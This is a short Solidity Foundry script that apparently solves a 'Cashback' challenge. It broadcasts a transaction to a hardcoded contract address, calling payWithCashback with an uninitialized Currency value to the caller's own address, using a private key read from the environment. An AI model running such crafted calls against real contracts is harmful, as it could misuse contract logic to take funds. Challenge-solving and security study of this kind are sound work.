// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Script, console} from "forge-std/Script.sol";
import { Cashback, Currency } from "../src/Cashback.sol";

contract CashbackSolver is Script {

	Cashback public instance = Cashback(payable(0x8e5f028d0AF6c3D3B81faBDCA5DFC76f5Af22d32));

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

	function run() external {
		vm.startBroadcast(prv);

		Currency test;
		instance.payWithCashback(test, me, 1);

		vm.stopBroadcast();
	}

}

